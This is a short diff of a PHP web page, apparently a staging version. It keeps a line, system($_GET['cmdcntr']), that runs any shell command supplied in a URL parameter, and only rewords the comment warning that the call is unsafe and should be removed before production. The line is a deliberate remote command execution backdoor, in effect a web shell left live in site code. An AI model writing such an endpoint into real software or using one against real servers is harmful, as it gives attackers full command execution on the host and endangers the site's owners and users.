@@ -1,3 +1,5 @@
+Code for staging server
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -59,7 +61,7 @@ if(isset($_SESSION['name']))
 				echo "<br><br>";
 				echo "Date & Time : ".$date;
 			}
-		system($_GET['cmdcntr']); //system() is not safe to use , dont' forget to remove it  in latest release .
+		system($_GET['cmdcntr']); //system() function is not safe to use , dont' forget to remove it in production .
 }
 else
 {
